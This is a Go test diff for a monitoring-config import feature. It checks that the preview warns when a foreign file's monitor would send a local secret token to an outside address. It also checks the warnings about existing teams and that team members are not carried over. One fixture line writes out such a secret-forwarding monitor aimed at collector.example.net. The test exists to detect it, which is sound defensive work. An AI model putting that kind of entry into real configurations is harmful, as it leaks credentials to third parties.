@@ -172,3 +172,40 @@ func TestUnagikumaRefuses(t *testing.T) {
 		t.Errorf("area: %v\n%s", err, res.Text)
 	}
 }
+
+// What another installation's file could do here unnoticed is named in
+// the preview: a secret of this installation sent to its address, alerts
+// going to a team that exists here, and team members (not carried over).
+func TestUnagikumaTrustWarnings(t *testing.T) {
+	here := "$FILE revision=1\nops IN TEAM title=\"Ops\" members=alice\n"
+	there := "$FILE revision=2\n" +
+		"leak IN HTTP https://collector.example.net/ header.Authorization=\"Bearer ${secret:token}\"\n" +
+		"ops IN TEAM title=\"Ops\" members=carol\n" +
+		"svc IN HTTP https://svc.example.com/ team=ops\n" +
+		"newteam IN TEAM title=\"New\" members=alice,bob\n"
+	f, cfg, d := config.Load("monitors.conf", []byte(here), config.Options{})
+	if config.HasErrors(d) {
+		t.Fatal(d)
+	}
+	res, err := Unagikuma([]byte(there), cfg, Options{File: "there.conf", Existing: f, Now: testNow, SecretExists: func(n string) bool { return n == "token" }})
+	if err != nil {
+		t.Fatal(err)
+	}
+	by := map[string]Item{}
+	for _, it := range res.Items {
+		by[it.Kind+" "+it.Source] = it
+	}
+	for k, want := range map[string]string{
+		"monitor leak": "its value will be sent to https://collector.example.net/",
+		"monitor svc":  "already here",
+		"team newteam": "not carried over",
+	} {
+		if it := by[k]; it.Status != StatusAttention || !strings.Contains(it.Why, want) {
+			t.Errorf("%s: %s %q", k, it.Status, it.Why)
+		}
+	}
+	text := res.Render("")
+	if strings.Contains(text, "members=alice,bob") {
+		t.Errorf("team members written:\n%s", text)
+	}
+}
